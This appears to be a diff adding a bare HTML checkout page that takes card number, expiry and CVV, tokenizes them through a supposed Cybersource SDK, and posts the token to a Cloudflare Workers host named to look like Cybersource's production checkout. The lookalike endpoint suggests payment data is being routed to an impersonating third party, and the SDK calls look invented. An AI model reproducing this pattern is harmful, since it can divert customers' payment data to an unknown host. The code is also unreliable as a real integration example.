@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Checkout</title>
+</head>
+<body>
+    <form id="checkout-form">
+        <input type="text" name="cardNumber" placeholder="Card Number" required>
+        <input type="text" name="expiryDate" placeholder="Expiry Date" required>
+        <input type="text" name="cvv" placeholder="CVV" required>
+        <button type="submit">Pay</button>
+    </form>
+
+    <script src="https://secure.cybersource.com/checkout/sdk.js"></script>
+    <script>
+        document.getElementById('checkout-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const checkout = new Cybersource.Checkout({
+                // Configuration options
+            });
+
+            checkout.tokenize({
+                cardNumber: document.querySelector('input[name="cardNumber"]').value,
+                expiryDate: document.querySelector('input[name="expiryDate"]').value,
+                cvv: document.querySelector('input[name="cvv"]').value
+            }).then(function(token) {
+                fetch('https://cybs-unifiedcheckoutprod.apt-account.workers.dev/', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ token: token })
+                }).then(response => response.json())
+                  .then(data => {
+                      console.log('Payment processed:', data);
+                  })
+                  .catch(error => {
+                      console.error('Error processing payment:', error);
+                  });
+            }).catch(function(error) {
+                console.error('Error tokenizing payment info:', error);
+            });
+        });
+    </script>
+</body>
+</html>
